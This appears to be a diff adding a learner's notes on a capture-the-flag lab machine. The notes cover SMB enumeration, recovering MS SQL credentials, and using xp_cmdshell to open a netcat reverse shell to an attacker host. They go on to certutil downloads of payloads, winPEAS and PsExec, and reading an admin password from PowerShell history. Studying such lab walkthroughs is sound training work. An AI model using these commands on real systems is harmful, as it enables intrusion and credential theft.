@@ -1,0 +1,25 @@
+- nmap -sV 10.129.181.82 reveals SQL DB running on port 1433
+- smbclient -N -L 10.129.181.82 reveals available shares on the target over SMB (admin shares end with $)
+- smbclient //10.129.181.82/backups (asks for kali password) to connect over smb. ls to view files, get prod.dtsConfig to download the one file there, and the requested password is then visible in that downloaded file
+- a quick google reveals that the "Impacket collection" provides the mssqlclient.py script to establish an authenticated connection to a MS SQL server: python3 mssqlclient.py sql_svc:M3g4c0rp123@10.129.181.82 -port 1433 -windows-auth : (https://github.com/fortra/impacket)
+- the HackTricks Pentesting cheat sheet reveals the extended stored procedure of MS SQL Server that can be used to spawn a command shell is "xp_cmdshell" (https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html)
+- a google search reveals a WinPEAS is a popular tool to search for possible privilege escalation paths within a Windows host (https://www.manageengine.com/log-management/cyber-security/privilege-escalation-with-winpeas.html)
+- had to get the netcat .exe file over to the server to run the following procedure to gain a reverse shell: EXEC xp_cmdshell 'C:\Users\sql_svc\nc.exe 10.10.14.255 4444 -e cmd.exe';
+- we then grabbed the winPEASx86.exe file from the web to our attacker host, then used our shell to transfer it to the victim and run it outputting to a file that we can then search: findstr "..........._..........t" output.txt to find the file that is storing keystrokes in the console app (this file is where we can find the admin's password - ): PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+- we can then see the admin password with: type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt (MEGACORP_4dm1n!!)
+- user flag located in Users\sql_svc\Desktop\user.txt 
+- to switch to admin account we had top use: python3 psexec.py administrator@10.129.181.82 :because runas /user:Administrator cmd in our reverse shell would not allow password entry, and thus we could not become root/admin account
+
+
+EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.14.255/payload.exe C:\nc.exe';
+EXEC xp_cmdshell 'C:\Users\sql_svc\nc.exe 10.10.14.255 4444 -e cmd.exe';
+certutil -urlcache -split -f http://10.10.14.255/winPEASx86.exe winPEASx86.exe
+certutil -urlcache -split -f http://10.10.14.255/PsExec.exe PsExec.exe
+
+powershell -Command "& {Invoke-WebRequest -Uri http://10.10.14.255:8080/output.txt -OutFile C:\Users\sql_svc\output.txt}"
+certutil -urlcache -split -f http://10.10.14.255/winPEASoutput.txt:8080 output.txt
+findstr "..........._..........t" output.txt
+PsExec.exe -u Administrator -p "MEGACORP_4dm1n!!" type \..\..\Users\Administrator\user.txt
+PsExec.exe -u Administrator -p "MEGACORP_4dm1n!!" cmd /c "dir C:\Users\Administrator"
+PsExec.exe -u Administrator -p "MEGACORP_4dm1n!!" "C:\Windows\System32\cmd.exe" /c "dir C:\Users\Administrator"
+
